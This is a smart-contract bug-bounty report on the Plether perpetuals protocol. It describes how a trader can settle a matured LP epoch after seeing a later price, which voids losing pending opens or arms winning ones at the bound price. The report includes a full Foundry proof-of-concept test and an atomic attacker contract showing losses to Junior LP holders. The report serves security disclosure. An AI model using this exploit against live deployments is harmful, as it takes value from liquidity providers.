# \#99873 [SC-Low] LP epoch settlement lets a trader arm or void a binding open after seeing the next price

**Submitted on Nov 15th 2026 at 16:01:05 UTC by @thimthor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99873
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Relevant context

In the PoC, the open is committed before the first eligible price update `E` and a later update `M` are published. `PletherOracle` uses Pyth's [`parsePriceFeedUpdatesUnique`](https://api-reference.pyth.network/price-feeds/evm/parsePriceFeedUpdatesUnique) to bind execution to `E`, even when `M` is public while the order is pending. That parser reads signed historical updates, so submitting `M` for LP settlement does not replace the order's eligible `E`. The owner has no direct cancel function. The protocol [states](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L645-L659) that binding orders prevent queued intents from becoming free options.

With open positions, `HousePool.settleLpEpoch` requires a fresh, current-epoch mark and a call through the Router. `OrderRouter.settleLpEpoch(bytes[])` supplies both and is permissionless (`OrderRouter.sol:474-484`; `HousePool.sol:797-821`). It can settle a matured request while an open is pending.

Plether [intentionally excludes live depth and skew from the pinned execution configuration](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L767-L775). Here the pending order's owner can trigger the depth change after seeing `M` and turn the protocol's terminal risk check into a choice between fill and refund at unchanged `E`.

## Finding description

LP settlement changes pool depth. Funding a redemption lowers `accountedAssets`; activating a deposit raises it (`HousePool.sol:861-888, 1062-1084`). Execution reads `HousePool.totalAssets()` at that moment, after the order was committed (`OrderRouterExecutionSidecar.sol:933, 953`):

```solidity
// OrderRouterExecutionSidecar.sol, _executionItem
@> request.poolDepthAssets = IHousePool(engine_.pool()).totalAssets();
```

The planner derives the open's skew cap from that depth (`CfdEnginePlanLib.sol:448-479`). A failed skew check is terminal, releases committed margin, and pays the execution bounty to the executor. The trader can execute their own failure and recover that bounty.

Two outcomes follow from the same flaw:

1. **Fund a redemption to void a losing open.** A trader commits an open just below the skew cap while another LP's redemption is mature. Once `E` and a newer, adverse `M` are public, the trader calls `settleLpEpoch` and `executeOrder` in that order. Funding the redemption lowers the cap. The open fails with `SKEW_TOO_HIGH` at its unchanged bound price `E`. If `M` is favourable, the trader leaves the epoch unsettled and executes the open at `E`.
2. **Activate a deposit to arm a winning open.** The trader sets `maxActionChargeAssets` between the charge at current depth and the lower charge after another LP's mature deposit activates. Before activation, execution fails on the bound. If `M` is favourable, the trader settles first; the lower depth-dependent charge passes the same committed bound and the open fills at `E`. If `M` is adverse, the trader lets the order fail. The bound is enforced at execution in `CfdOrderPolicyEvaluatorBase.sol:509-513`.

The PoC also refreshes the mark to `M` without LP settlement. The redemption open still fills, and the deposit open still fails. The depth change, not the mark refresh alone, flips each result.

Settlement and execution are public calls and can be placed in one transaction, as the PoC's attacker contract shows. A third party's LP request suffices, so the trader needs no LP shares. The trader could instead fund their own request in advance, but that commits LP capital.

The redemption route requires no trader-selected execution bound. The deposit route uses one; the [accounting spec](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L917-L931) says market-dependent financial bounds remain live. The impact claim rests on the redemption route; deposit activation shows the same settlement-order dependency through a separate check.

The earlier [SC-M4 report](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-pre-audit-report.pdf#page=29) described stale-tick selection across two orders and LP-depth cancellation. Its published [fix](https://github.com/Plether-Fi/plether-core/pull/24) bound execution to the first eligible Pyth tick. A single open here is evaluated against that same tick `E` in both branches; settling a matured LP request after `M` appears still determines whether it fills.

[PR #61](https://github.com/Plether-Fi/plether-core/pull/61) accepts that epoch settlement can precede a close or liquidation that realizes an existing position's loss. This PoC changes whether a pending open fills at all. The competition rules allow reports demonstrating an incomplete fix.

## Impact explanation

The PoC uses the release's six-feed basket, risk parameters, and Senior limits. It starts with about 1 million USDG of Junior capital and a balanced existing book. The trader has no LP shares.

At an adverse `M`, both paths evaluate the open against the same price `E` and end with the same redemption funded. Settling first voids the open; executing first fills it. The trader avoids a 1,551.201838 USDG loss versus that forced-fill control, while the existing 900,000 USDG Junior depositor's share value is 1,252.839177 USDG lower. Pool assets plus funded redemption escrow are 1,392.044917 USDG lower.

At a favourable `M`, the trader executes first and closes at a later tick `C`, finishing +832.858240 USDG ahead. The PoC holds `C` at the same numerical price as `M`; live retracement would reduce that gain. Across the favourable and adverse cases, this selective strategy gains 832.858240 USDG while the same depositor's share value falls 892.812754 USDG. Separately, the deposit route gains 629.397714 USDG for the trader and leaves that depositor's share value 562.021688 USDG below the default-failure control.

These are paired scenario outcomes, not a measured expected return. Every attacker position is closed, each attacker order is terminal, and the trader withdraws the resulting balance. The PoC excludes transaction gas and access to signed Pyth data.

## Recommendation

Make a pending open's fill or terminal refund independent of when its owner settles a matured LP epoch. Reserve the depth needed for skew and action-charge assessments until the open executes or expires, while retaining live solvency checks. Any delay to LP settlement should have a bounded path to completion. Cover both redemption funding and deposit activation.


## Proof of Concept

## Proof of concept

Add the following file as `packages/perps/test/perps/spec/trader/LpEpochBindingOptionSubmission.t.sol` in a fresh checkout. It uses the repository's `BasePerpTest` and `MockPyth`; no contract, remapping, or Foundry configuration change is needed. The helper performs settlement and order execution in one transaction. Run:

```bash
forge test --root packages/perps --match-contract LpEpochBindingOptionSubmissionTest -vv
```

Result: **2 passed, 0 failed.** At the adverse tick, the atomic redemption path leaves the existing Junior holder 1,252.839177 USDG worse off than the forced-fill control. At the favourable tick, the trader realizes +832.858240 USDG; the deposit case separately earns +629.397714 USDG.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {CfdEnginePlanTypes} from "@plether/perps/CfdEnginePlanTypes.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {IMarginAccount} from "@plether/perps/interfaces/IMarginAccount.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IPerpsKeeper} from "@plether/perps/interfaces/IPerpsKeeper.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {Vm} from "forge-std/Vm.sol";

contract LpEpochBindingOptionSubmissionTest is BasePerpTest {

    address constant TRADER = address(0xA77);
    address constant VICTIM = address(0xB0B);
    address constant OTHER_LP = address(0x1A02);
    address constant DEPOSITOR = address(0x1DE9);
    address constant KEEPER = address(0xEE9);
    uint256 constant E = 95_974_878; // six-feed basket at the release fixture's anchor prices
    uint256 constant PYTH_FEE = 1 wei;

    struct Result {
        bool filled;
        int256 traderPnl;
        uint256 victimValue;
        uint256 poolAssetsAndEscrow;
        OrderV3Types.OrderReceipt receipt;
    }

    uint64 orderId;
    uint64 commitTime;
    uint256 depositId;
    uint256 redeemId;
    AtomicLpEpochExecutor atomicExecutor;

    // Release risk parameters; the mock replaces only the out-of-scope Pyth contract.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        atomicExecutor = new AtomicLpEpochExecutor(
            IPerpsKeeper(address(router)), IMarginAccount(address(clearinghouse)), IERC20(address(settlementToken))
        );
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.minOpenNotionalAssets = 1000e6;
        config.basketMaxConfidenceRatioBps = 10;
        config.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(config);
        _setSeniorCapacity(40_000_000e6, 8000);
        baseMockPyth.setFee(PYTH_FEE);
        (bytes32[] memory ids, uint256[] memory weights, uint256[] memory bases, bool[] memory inverted,,) =
            _productionFeeds();
        PletherOracle candidate =
            new PletherOracle(address(engine), address(pool), address(baseMockPyth), ids, weights, bases, inverted);
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig(address(candidate)));
        vm.warp(routerAdmin.oracleConfigActivationTime());
        routerAdmin.finalizeOracleConfig();
        vm.deal(address(this), 1 ether);
        vm.deal(TRADER, 1 ether);
        vm.deal(KEEPER, 1 ether);
        vm.warp(SETUP_TIMESTAMP + ((block.timestamp - SETUP_TIMESTAMP) / 7 days + 1) * 7 days);

        _fundJunior(VICTIM, 900_000e6);
        _fundJunior(OTHER_LP, 100_000e6);
        _tick();
        _mark(E);
        assertEq(engine.lastMarkPrice(), E);
        _filledOpen(address(0x1001), CfdTypes.Side.LONG);
        _filledOpen(address(0x1002), CfdTypes.Side.SHORT);
    }

    function test_RedemptionLetsTraderVoidOnlyTheLosingOpen() public {
        // An independent LP's redemption has matured but has not been funded.
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);
        _tick();
        _mark(E);
        uint256 shares = juniorVault.convertToShares(20_000e6);
        vm.prank(OTHER_LP);
        redeemId = juniorVault.requestRedeem(shares, OTHER_LP, OTHER_LP);
        vm.warp(juniorVault.depositEpochStart(redeemId) + 2);
        _mark(E);

        // Current net skew is zero. The open fits 40% of depth with 0.5% slack.
        uint256 notional = pool.totalAssets() * 4000 / 10_000 * 9950 / 10_000;
        _commitLong(_sizeFor(notional), type(uint256).max);
        uint256 start = _poolAssetsAndEscrow();
        uint256 victimStart = juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM));
        uint256 root = vm.snapshotState();
        uint256 favourableM = E * 9970 / 10_000; // LONG gains when the basket falls
        uint256 adverseM = E * 10_030 / 10_000;

        Result memory win = _resolve(favourableM, false);
        assertTrue(win.filled);
        assertTrue(vm.revertToState(root));
        Result memory avoidedLoss = _resolve(adverseM, true);
        assertFalse(avoidedLoss.filled);
        assertEq(avoidedLoss.receipt.failure.code, uint8(CfdEnginePlanTypes.OpenRevertCode.SKEW_TOO_HIGH));
        assertEq(avoidedLoss.receipt.oraclePublishTime, commitTime + 1);
        assertTrue(vm.revertToState(root));
        Result memory forcedLoss = _resolve(adverseM, false);
        assertTrue(forcedLoss.filled);
        assertTrue(vm.revertToState(root));
        vm.prank(KEEPER);
        router.updateMarkPrice{value: PYTH_FEE}(_feeds(adverseM, commitTime + 2));
        Result memory markOnly = _resolve(adverseM, false);
        assertTrue(markOnly.filled); // the newer mark alone does not void the open

        // Both paths end with the same LP redemption funded and the same later mark.
        assertGt(win.traderPnl, 0);
        assertEq(avoidedLoss.traderPnl, 0);
        assertLt(forcedLoss.traderPnl, 0);
        assertLt(int256(win.poolAssetsAndEscrow + avoidedLoss.poolAssetsAndEscrow) - 2 * int256(start), 0);
        assertGe(int256(win.poolAssetsAndEscrow + forcedLoss.poolAssetsAndEscrow) - 2 * int256(start), 0);
        assertLt(int256(win.victimValue + avoidedLoss.victimValue) - 2 * int256(victimStart), 0);
        assertLt(avoidedLoss.victimValue, forcedLoss.victimValue);
        emit log_named_decimal_int(
            "attacker PnL over favourable and adverse ticks", win.traderPnl + avoidedLoss.traderPnl, 6
        );
        emit log_named_decimal_int(
            "pool assets plus redemption escrow, attack",
            int256(win.poolAssetsAndEscrow + avoidedLoss.poolAssetsAndEscrow) - 2 * int256(start),
            6
        );
        emit log_named_decimal_int(
            "pool assets plus redemption escrow, bound fill",
            int256(win.poolAssetsAndEscrow + forcedLoss.poolAssetsAndEscrow) - 2 * int256(start),
            6
        );
        emit log_named_decimal_int(
            "victim Junior share value change, attack",
            int256(win.victimValue + avoidedLoss.victimValue) - 2 * int256(victimStart),
            6
        );
        emit log_named_decimal_int("attacker gain vs forced fill", avoidedLoss.traderPnl - forcedLoss.traderPnl, 6);
        emit log_named_decimal_int(
            "pool assets plus escrow lost vs forced fill",
            int256(forcedLoss.poolAssetsAndEscrow) - int256(avoidedLoss.poolAssetsAndEscrow),
            6
        );
        emit log_named_decimal_int(
            "victim share value lost vs forced fill",
            int256(forcedLoss.victimValue) - int256(avoidedLoss.victimValue),
            6
        );
    }

    function test_ThirdPartyDepositArmsOnlyTheWinningOpen() public {
        // The trader has no LP shares. An independent depositor supplies the depth change.
        settlementToken.mint(DEPOSITOR, 200_000e6);
        vm.startPrank(DEPOSITOR);
        settlementToken.approve(address(juniorVault), 200_000e6);
        depositId = juniorVault.requestDeposit(200_000e6, DEPOSITOR, DEPOSITOR);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(depositId) + 2);
        _mark(E);

        uint256 size = _sizeFor(300_000e6);
        uint256 defaultCharge = _quoteCharge(size, false);
        uint256 armedCharge = _quoteCharge(size, true);
        assertLt(armedCharge, defaultCharge);
        uint256 bound = (defaultCharge + armedCharge) / 2;
        _commitLong(size, bound);
        assertEq(juniorVault.balanceOf(TRADER), 0);
        uint256 root = vm.snapshotState();
        uint256 favourableM = E * 9970 / 10_000;
        uint256 adverseM = E * 10_030 / 10_000;

        Result memory win = _resolve(favourableM, true);
        assertTrue(win.filled);
        assertLt(win.receipt.economics.actionChargeAssessedAssets, bound);
        assertTrue(vm.revertToState(root));
        Result memory missedWin = _resolve(favourableM, false);
        assertFalse(missedWin.filled);
        assertEq(uint8(missedWin.receipt.failure.constraint), uint8(OrderV3Types.ConstraintKind.ActionCharge));
        assertTrue(vm.revertToState(root));
        Result memory avoidedLoss = _resolve(adverseM, false);
        assertFalse(avoidedLoss.filled);
        assertTrue(vm.revertToState(root));
        Result memory forcedLoss = _resolve(adverseM, true);
        assertTrue(forcedLoss.filled);
        assertTrue(vm.revertToState(root));
        vm.prank(KEEPER);
        router.updateMarkPrice{value: PYTH_FEE}(_feeds(favourableM, commitTime + 2));
        Result memory markOnly = _resolve(favourableM, false);
        assertFalse(markOnly.filled); // the newer mark alone does not arm the open
        assertEq(uint8(markOnly.receipt.failure.constraint), uint8(OrderV3Types.ConstraintKind.ActionCharge));

        assertGt(win.traderPnl, 0);
        assertEq(avoidedLoss.traderPnl, 0);
        assertLt(forcedLoss.traderPnl, 0);
        assertLt(win.victimValue, missedWin.victimValue);
        assertLt(win.poolAssetsAndEscrow, missedWin.poolAssetsAndEscrow);
        emit log_named_decimal_uint("charge without deposit activation", defaultCharge, 6);
        emit log_named_decimal_uint("charge after deposit activation", armedCharge, 6);
        emit log_named_decimal_int("attacker profit on favourable tick", win.traderPnl, 6);
        emit log_named_decimal_int(
            "pool assets lost vs default failure",
            int256(missedWin.poolAssetsAndEscrow) - int256(win.poolAssetsAndEscrow),
            6
        );
        emit log_named_decimal_int(
            "victim LP value lost vs default failure", int256(missedWin.victimValue) - int256(win.victimValue), 6
        );
    }

    function _resolve(
        uint256 decisionPriceM,
        bool settleFirst
    ) internal returns (Result memory r) {
        uint256 closePriceC = decisionPriceM; // a later signed tick at the same price; live retracement reduces profit
        uint256 beforeWealth = _wealth();
        vm.recordLogs();
        if (settleFirst) {
            vm.prank(TRADER);
            r.filled = atomicExecutor.settleAndExecute{value: 3 * PYTH_FEE}(
                    orderId, _feeds(decisionPriceM, commitTime + 2), _feeds(E, commitTime + 1), PYTH_FEE
                )
                .status == OrderV3Types.LifecycleStatus.Executed;
        } else {
            r.filled = _execute(TRADER, orderId, E, commitTime + 1).status == OrderV3Types.LifecycleStatus.Executed;
        }
        r.receipt = _receipt();
        assertEq(r.receipt.oraclePublishTime, commitTime + 1);
        if (r.filled) {
            _tick();
            OrderV3Types.OrderRequest memory close = _request(CfdTypes.Side.LONG, _positionSize(), 0, CAP_PRICE, true);
            vm.prank(TRADER);
            uint64 closeId = router.commitOrder(close);
            _tick();
            assertEq(
                uint8(_execute(KEEPER, closeId, closePriceC, block.timestamp).status),
                uint8(OrderV3Types.LifecycleStatus.Executed)
            );
        } else {
            assertEq(r.receipt.bountyRecipient, settleFirst ? address(atomicExecutor) : TRADER);
            assertEq(_wealth(), beforeWealth); // the atomic helper returns its bounty to the trader
        }
        vm.warp(commitTime + 6);
        vm.roll(block.number + 1);
        vm.prank(KEEPER);
        if (settleFirst) {
            router.updateMarkPrice{value: PYTH_FEE}(_feeds(closePriceC, block.timestamp));
        } else {
            router.settleLpEpoch{value: PYTH_FEE}(_feeds(closePriceC, block.timestamp));
        }
        assertEq(_positionSize(), 0);
        assertEq(engine.traderClaimBalanceAssets(TRADER), 0);
        uint256 withdrawable = clearinghouse.balanceAssets(TRADER);
        vm.prank(TRADER);
        clearinghouse.withdraw(TRADER, withdrawable);
        r.traderPnl = int256(settlementToken.balanceOf(TRADER)) - int256(beforeWealth);
        r.victimValue = juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM));
        r.poolAssetsAndEscrow = _poolAssetsAndEscrow();
    }

    function _quoteCharge(
        uint256 size,
        bool settleFirst
    ) internal returns (uint256 charge) {
        uint256 snapshot = vm.snapshotState();
        _commitLong(size, type(uint256).max);
        if (settleFirst) {
            vm.prank(TRADER);
            router.settleLpEpoch{value: PYTH_FEE}(_feeds(E, commitTime + 1));
        }
        vm.recordLogs();
        assertEq(
            uint8(_execute(TRADER, orderId, E, commitTime + 1).status), uint8(OrderV3Types.LifecycleStatus.Executed)
        );
        charge = _receipt().economics.actionChargeAssessedAssets;
        assertTrue(vm.revertToState(snapshot));
    }

    function _commitLong(
        uint256 size,
        uint256 maxCharge
    ) internal {
        uint256 margin = size * E / 1e20 / 20;
        _fundTrader(TRADER, margin + _quoteOpenOrderExecutionBountyAssets(size));
        OrderV3Types.OrderRequest memory open = _request(CfdTypes.Side.LONG, size, margin, 1, false);
        open.bounds.maxActionChargeAssets = maxCharge;
        vm.prank(TRADER);
        orderId = router.commitOrder(open);
        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(orderId);
        commitTime = pending.commitTime;
        vm.warp(commitTime + 3); // E and the later tick are now public; the order is still pending
        vm.roll(block.number + 1);
    }

    function _filledOpen(
        address account,
        CfdTypes.Side side
    ) internal {
        uint256 size = _sizeFor(200_000e6);
        _fundTrader(account, 100_000e6);
        OrderV3Types.OrderRequest memory open =
            _request(side, size, 10_000e6, side == CfdTypes.Side.LONG ? 1 : CAP_PRICE, false);
        vm.prank(account);
        uint64 id = router.commitOrder(open);
        _tick();
        assertEq(uint8(_execute(KEEPER, id, E, block.timestamp).status), uint8(OrderV3Types.LifecycleStatus.Executed));
    }

    function _request(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 target,
        bool close
    ) internal view returns (OrderV3Types.OrderRequest memory r) {
        r = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(side, size, close, block.timestamp)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: target,
            isClose: close,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp + router.maxExecutionWindowSeconds()),
                executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _feeds(
        uint256 price,
        uint256 publishTime
    ) internal pure returns (bytes[] memory data) {
        (bytes32[] memory ids,,, bool[] memory inverted, uint256[] memory anchor, int32[] memory expo) =
            _productionFeeds();
        MockPyth.FeedUpdate[] memory feeds = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            uint256 raw = inverted[i] ? anchor[i] * E / price : anchor[i] * price / E;
            feeds[i] = MockPyth.FeedUpdate({
                id: ids[i],
                price: MockPyth.MockPrice({
                    price: int64(int256(raw)),
                    conf: uint64(raw * 2 / 10_000),
                    expo: expo[i],
                    publishTime: publishTime,
                    prevPublishTime: publishTime - 1
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(feeds);
    }

    function _productionFeeds()
        internal
        pure
        returns (
            bytes32[] memory ids,
            uint256[] memory weights,
            uint256[] memory bases,
            bool[] memory inverted,
            uint256[] memory anchor,
            int32[] memory expo
        )
    {
        ids = new bytes32[](6);
        weights = new uint256[](6);
        bases = new uint256[](6);
        inverted = new bool[](6);
        anchor = new uint256[](6);
        expo = new int32[](6);
        (ids[0], weights[0], bases[0], anchor[0], expo[0]) =
        (0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b, 576e15, 117_500_000, 111_765, -5);
        (ids[1], weights[1], bases[1], anchor[1], expo[1]) =
        (0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52, 136e15, 638_000, 158_610, -3);
        (ids[2], weights[2], bases[2], anchor[2], expo[2]) =
        (0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1, 119e15, 134_480_000, 132_299, -5);
        (ids[3], weights[3], bases[3], anchor[3], expo[3]) =
        (0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca, 91e15, 72_880_000, 142_660, -5);
        (ids[4], weights[4], bases[4], anchor[4], expo[4]) =
        (0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676, 42e15, 10_860_000, 1_002_015, -5);
        (ids[5], weights[5], bases[5], anchor[5], expo[5]) =
        (0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8, 36e15, 126_100_000, 83_293, -5);
        (inverted[1], inverted[3], inverted[4], inverted[5]) = (true, true, true, true);
    }

    function _receipt() internal view returns (OrderV3Types.OrderReceipt memory receipt) {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].topics.length > 1 && logs[i].topics[0] == IOrderLifecycleBook.OrderFinalized.selector) {
                (,,, receipt) = abi.decode(logs[i].data, (bytes32, uint64, uint64, OrderV3Types.OrderReceipt));
                return receipt;
            }
        }
        revert("missing OrderFinalized");
    }

    function _execute(
        address caller,
        uint64 id,
        uint256 price,
        uint256 publishTime
    ) internal returns (OrderV3Types.ExecutionResult memory r) {
        vm.prank(caller);
        r = router.executeOrder{value: 2 * PYTH_FEE}(id, _feeds(price, publishTime));
    }

    function _mark(
        uint256 price
    ) internal {
        vm.prank(KEEPER);
        router.updateMarkPrice{value: PYTH_FEE}(_feeds(price, block.timestamp));
    }

    function _sizeFor(
        uint256 notional
    ) internal pure returns (uint256) {
        return notional / E * 1e20;
    }

    function _positionSize() internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(TRADER);
    }

    function _wealth() internal view returns (uint256) {
        return settlementToken.balanceOf(TRADER) + clearinghouse.balanceAssets(TRADER)
            + engine.traderClaimBalanceAssets(TRADER);
    }

    function _poolAssetsAndEscrow() internal view returns (uint256) {
        return pool.totalAssets() + (redeemId == 0 ? 0 : juniorVault.claimableRedeemAssets(redeemId, OTHER_LP));
    }

    function _tick() internal {
        vm.warp(block.timestamp + 1);
        vm.roll(block.number + 1);
    }

}

contract AtomicLpEpochExecutor {

    IPerpsKeeper immutable keeper;
    IMarginAccount immutable marginAccount;
    IERC20 immutable token;

    constructor(
        IPerpsKeeper keeper_,
        IMarginAccount marginAccount_,
        IERC20 token_
    ) {
        keeper = keeper_;
        marginAccount = marginAccount_;
        token = token_;
    }

    receive() external payable {}

    function settleAndExecute(
        uint64 orderId,
        bytes[] calldata markUpdate,
        bytes[] calldata executionUpdate,
        uint256 settleFee
    ) external payable returns (OrderV3Types.ExecutionResult memory result) {
        keeper.settleLpEpoch{value: settleFee}(markUpdate);
        result = keeper.executeOrder{value: msg.value - settleFee}(orderId, executionUpdate);
        uint256 bounty = marginAccount.getAccountEquityAssets(address(this));
        if (bounty != 0) {
            marginAccount.withdrawMargin(bounty);
            require(token.transfer(msg.sender, bounty));
        }
    }

}
```
